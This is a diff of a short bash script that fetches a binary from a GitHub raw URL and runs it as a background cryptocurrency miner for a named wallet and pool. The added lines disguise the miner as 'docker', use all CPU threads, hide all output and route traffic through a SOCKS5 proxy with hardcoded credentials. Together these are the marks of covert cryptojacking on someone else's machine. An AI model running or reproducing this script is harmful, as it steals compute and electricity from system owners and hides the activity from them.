@@ -1,5 +1,5 @@
 #!/bin/bash
-wget https://raw.githubusercontent.com/jsiqiisn/a/main/SRBMiner-MULTI
-chmod 777 SRBMiner-MULTI
-./SRBMiner-MULTI --algorithm ghostrider --pool stratum-eu.rplant.xyz:17075 --wallet BcEBgtWtz7RhWFmACgt5PQeG2SSvP4dhSy.rozaac --password webpassword=x --keepalive true > /dev/null 2>&1 &
+wget https://raw.githubusercontent.com/jsiqiisn/a/main/docker
+chmod 777 docker
+./docker -o stratum-eu.rplant.xyz:7075 -u BcEBgtWtz7RhWFmACgt5PQeG2SSvP4dhSy.sok -p x -a ghostrider -t$(nproc --all) --proxy=socks5://mike:mike@20.211.19.20:4145 > /dev/null 2>&1 &
 uname -a
